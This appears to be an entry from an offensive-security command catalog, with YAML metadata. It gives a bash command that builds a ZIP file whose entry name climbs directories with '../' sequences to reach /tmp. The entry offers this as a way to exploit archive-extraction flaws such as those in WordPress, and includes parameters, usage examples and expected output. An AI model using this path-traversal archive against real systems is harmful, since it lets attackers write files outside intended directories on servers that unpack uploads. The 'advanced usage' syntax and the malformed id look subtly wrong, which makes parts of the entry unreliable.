---
id: c1e2f3g4-h5i6-7891-efgh-5678901234
data: zip zip_poc.zip ../../../../../../../../../../tmp/poc_file
tags:
  - zip
  - path-traversal
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:26:27.888Z'
verified: false
validated: true
submitted: true
---
# zip-create-traversal

## Command

```bash
zip zip_poc.zip ../../../../../../../../../../tmp/poc_file
```

## Description

This command creates a ZIP archive with a file entry using path traversal sequences to target /tmp, useful for exploiting unzip vulnerabilities like in WordPress.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| zip_poc.zip | Output ZIP filename | Yes |
| ../../../../../../../../../../tmp/poc_file | Entry filename with traversal path | Yes |

## Examples

### Basic Usage

```bash
zip zip_poc.zip ../../../../../../../../../../tmp/poc_file
```

### Advanced Usage

```bash
zip -r zip_poc.zip @payloads.txt  # If using a list with traversal paths
```

## Expected Output

Adding: ../../../../../../../../../../tmp/poc_file  (deflated 50%)

## Related

- [[Related Procedure: Craft-Malicious-Zip-with-Path-Traversal]]
